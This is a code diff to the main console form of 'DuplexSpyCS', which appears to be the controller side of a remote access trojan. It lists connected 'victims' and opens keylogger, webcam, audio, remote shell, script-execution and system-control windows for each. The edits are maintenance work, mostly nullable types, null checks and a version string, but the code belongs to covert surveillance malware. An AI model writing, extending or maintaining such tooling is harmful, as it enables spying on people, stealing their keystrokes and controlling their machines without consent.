@@ -12,6 +12,8 @@ namespace DuplexSpyCS
 {
     public partial class frmMain : Form
     {
+        private string m_szVersion = "v2.1.0"; //Modify this value to change the title.
+
         NewListView newListView1 = new NewListView();
         ImageList ilRowHack = new ImageList();
 
@@ -69,7 +71,7 @@ namespace DuplexSpyCS
             return lsVictim;
         }
 
-        public void ColorStyle(ColorStyleMode style, Form f = null)
+        public void ColorStyle(ColorStyleMode style, Form? f = null)
         {
             Color backcolor = clsGlobal.dic_ColorModeStylee[style]["back"];
             Color forecolor = clsGlobal.dic_ColorModeStylee[style]["fore"];
@@ -90,6 +92,9 @@ namespace DuplexSpyCS
                         lv.OwnerDraw = true;
                         lv.DrawColumnHeader += (sender, e) =>
                         {
+                            if (e == null || e.Header == null)
+                                return;
+
                             using (SolidBrush brush = new SolidBrush(backcolor))
                             {
                                 e.Graphics.FillRectangle(brush, e.Bounds);
@@ -114,6 +119,9 @@ namespace DuplexSpyCS
                         };
                         lv.DrawSubItem += (sender, e) =>
                         {
+                            if (e == null || e.Item == null || e.SubItem == null)
+                                return;
+
                             Color backColor = e.ColumnIndex % 2 == 0 ? Color.LightYellow : Color.LightGreen;
 
                             using (SolidBrush brush = new SolidBrush(backColor))
@@ -858,7 +866,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "serv")
                 {
-                    frmManager f = clsTools.fnFindForm<frmManager>(v);
+                    frmManager? f = clsTools.fnFindForm<frmManager>(v);
                     if (f == null)
                         return;
 
@@ -873,7 +881,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "conn")
                 {
-                    frmManager f = clsTools.fnFindForm<frmManager>(v);
+                    frmManager? f = clsTools.fnFindForm<frmManager>(v);
                     if (f == null)
                         return;
 
@@ -888,7 +896,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "window")
                 {
-                    frmManager f = clsTools.fnFindForm<frmManager>(v);
+                    frmManager? f = clsTools.fnFindForm<frmManager>(v);
                     if (f == null)
                         return;
 
@@ -907,7 +915,8 @@ namespace DuplexSpyCS
                         {
                             string[] split = item.Split(',');
 
-                            Icon iWindow = null;
+                            Icon? iWindow = null;
+
                             if (split[1] != "?")
                             {
                                 byte[] iconBuffer = Convert.FromBase64String(split[1]);
@@ -916,6 +925,9 @@ namespace DuplexSpyCS
                                     iWindow = new Icon(ms);
                                 }
                             }
+
+                            if (iWindow == null)
+                                return;
 
                             WindowInfo info = new WindowInfo()
                             {
@@ -949,7 +961,6 @@ namespace DuplexSpyCS
                 }
 
                 #endregion
-
                 #region System
 
                 else if (cmd[0] == "system")
@@ -1391,6 +1402,9 @@ namespace DuplexSpyCS
 
         public void fnImplantConnected(clsListener l, clsVictim v, List<string> lsMsg)
         {
+            if (v.socket == null || v.socket.RemoteEndPoint == null)
+                return;
+
             ListViewItem item = new ListViewItem(lsMsg[0]);
             item.SubItems.Add(v.socket.RemoteEndPoint.ToString());
             for (int i = 1; i < lsMsg.Count; i++)
@@ -1500,6 +1514,7 @@ namespace DuplexSpyCS
         {
             //Remove this if implant is implemented.
             //tabControl1.Appearance = TabAppearance.FlatButtons;
+
             tabControl1.ItemSize = new Size(0, 1);
             tabControl1.SizeMode = TabSizeMode.Fixed;
 
@@ -1514,29 +1529,7 @@ namespace DuplexSpyCS
             catch (FileNotFoundException ex)
             {
                 MessageBox.Show($"INI config file not found. DuplexSpy will be terminated.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                /*
-                DialogResult dr = MessageBox.Show("config.ini not found.\nDo you want to open existed ini file? Click no to build ini file automatically.", "File Not Found", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
-                if (dr == DialogResult.Yes)
-                {
-                    OpenFileDialog ofd = new OpenFileDialog();
-                    ofd.Multiselect = false;
-                    ofd.Filter = "INI File(*.ini)|*.ini";
-                    if (ofd.ShowDialog() == DialogResult.OK)
-                    {
-                        clsStore.ini_manager = new clsIniManager(ofd.FileName);
-                    }
-                    else
-                    {
-                        MessageBox.Show("No file is selected, close DuplexSpyCS", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                        Close(); //Exit
-                    }
-                }
-                else
-                {
-                    //Todo: Build ini file automatically.
-                    //Release default ini file from resource.
-                }
-                */
+                //todo: Create defaut ini file.
             }
 
             m_sqlConn = new clsSqlConn("data.db"); //Set database.
@@ -1746,7 +1739,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in items)
             {
                 clsVictim victim = GetVictim(item);
-                frmManager f = clsTools.fnFindForm<frmManager>(victim);
+                frmManager? f = clsTools.fnFindForm<frmManager>(victim);
                 if (f == null)
                 {
                     f = new frmManager(victim);
@@ -1802,7 +1795,7 @@ namespace DuplexSpyCS
                 }
 
                 clsVictim v = GetVictim(item);
-                frmDesktop f = clsTools.fnFindForm<frmDesktop>(v);
+                frmDesktop? f = clsTools.fnFindForm<frmDesktop>(v);
                 if (f == null)
                 {
                     f = new frmDesktop(v);
@@ -1823,7 +1816,7 @@ namespace DuplexSpyCS
         {
             string szPorts = m_dicListener.Keys.Count == 0 ? string.Empty : string.Join(", ", m_dicListener.Keys.Select(x => m_dicListener[x]).Where(x => x.m_bIslistening).Select(x => x.m_nPort.ToString()));
 
-            Text = $"DuplexSpyCS v2.0.0 by ISSAC | " +
+            Text = $"DuplexSpyCS {m_szVersion} by ISSAC | " +
                 $"Port[{szPorts}] | " +
                 $"Online[{newListView1.Items.Count}] - " +
                 //$"Implant[{listView2.Items.Count}] - " +
@@ -1878,7 +1871,7 @@ namespace DuplexSpyCS
                 if (item.SubItems[9].Text != "0")
                 {
                     clsVictim v = GetVictim(item);
-                    frmWebcam f = clsTools.fnFindForm<frmWebcam>(v);
+                    frmWebcam? f = clsTools.fnFindForm<frmWebcam>(v);
                     if (f == null)
                     {
                         f = new frmWebcam(v);
@@ -1911,7 +1904,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in items)
             {
                 clsVictim v = GetVictim(item);
-                frmInfo f = clsTools.fnFindForm<frmInfo>(v);
+                frmInfo? f = clsTools.fnFindForm<frmInfo>(v);
                 if (f == null)
                 {
                     f = new frmInfo(v);
@@ -1940,7 +1933,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in items)
             {
                 clsVictim victim = GetVictim(item);
-                frmFunStuff f = clsTools.fnFindForm<frmFunStuff>(victim);
+                frmFunStuff? f = clsTools.fnFindForm<frmFunStuff>(victim);
 
                 if (f == null)
                 {
@@ -1988,7 +1981,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in items)
             {
                 clsVictim victim = GetVictim(item);
-                frmKeyLogger f = clsTools.fnFindForm<frmKeyLogger>(victim);
+                frmKeyLogger? f = clsTools.fnFindForm<frmKeyLogger>(victim);
                 if (f == null)
                 {
                     f = new frmKeyLogger(victim);
@@ -2017,7 +2010,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in items)
             {
                 clsVictim v = GetVictim(item);
-                frmChat f = clsTools.fnFindForm<frmChat>(v);
+                frmChat? f = clsTools.fnFindForm<frmChat>(v);
                 if (f == null)
                 {
                     f = new frmChat(v);
@@ -2111,7 +2104,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in items)
             {
                 clsVictim victim = GetVictim(item);
-                frmShell f = clsTools.fnFindForm<frmShell>(victim);
+                frmShell? f = clsTools.fnFindForm<frmShell>(victim);
                 if (f == null)
                 {
                     f = new frmShell(victim, ".");
@@ -2140,7 +2133,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in items)
             {
                 clsVictim victim = GetVictim(item);
-                frmClientConfig f = clsTools.fnFindForm<frmClientConfig>(victim);
+                frmClientConfig? f = clsTools.fnFindForm<frmClientConfig>(victim);
                 if (f == null)
                 {
                     f = new frmClientConfig(victim);
@@ -2169,7 +2162,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in items)
             {
                 clsVictim v = GetVictim(item);
-                frmWMI f = clsTools.fnFindForm<frmWMI>(v);
+                frmWMI? f = clsTools.fnFindForm<frmWMI>(v);
                 if (f == null)
                 {
                     f = new frmWMI(v);
@@ -2198,7 +2191,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in items)
             {
                 clsVictim victim = GetVictim(item);
-                frmAudio f = clsTools.fnFindForm<frmAudio>(victim);
+                frmAudio? f = clsTools.fnFindForm<frmAudio>(victim);
                 if (f == null)
                 {
                     f = new frmAudio(victim);
@@ -2241,7 +2234,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
-                frmPower f = clsTools.fnFindForm<frmPower>(v);
+                frmPower? f = clsTools.fnFindForm<frmPower>(v);
                 if (f == null)
                 {
                     f = new frmPower(v);
@@ -2270,7 +2263,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in items)
             {
                 clsVictim victim = GetVictim(item);
-                frmSystem f = clsTools.fnFindForm<frmSystem>(victim);
+                frmSystem? f = clsTools.fnFindForm<frmSystem>(victim);
                 if (f == null)
                 {
                     f = new frmSystem(victim);
@@ -2344,7 +2337,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in items)
             {
                 clsVictim victim = GetVictim(item);
-                frmRunScript f = clsTools.fnFindForm<frmRunScript>(victim);
+                frmRunScript? f = clsTools.fnFindForm<frmRunScript>(victim);
                 if (f == null)
                 {
                     f = new frmRunScript(victim);
@@ -2585,7 +2578,7 @@ namespace DuplexSpyCS
 
             foreach (var victim in ls)
             {
-                frmXterm f = clsTools.fnFindForm<frmXterm>(victim);
+                frmXterm? f = clsTools.fnFindForm<frmXterm>(victim);
                 if (f == null)
                 {
                     f = new frmXterm(victim);
